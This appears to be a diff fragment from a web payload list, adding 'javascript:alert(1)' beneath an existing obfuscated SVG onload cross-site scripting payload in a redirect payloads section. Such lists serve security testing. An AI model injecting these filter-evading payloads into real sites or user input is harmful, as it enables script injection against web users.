@@ -25,3 +25,5 @@ Redirect Payloads
 Other
 ------------
 "><svg/onload​=setTimeout`${'ale'+'rt'}(1)`>
+javascript:alert(1)
+
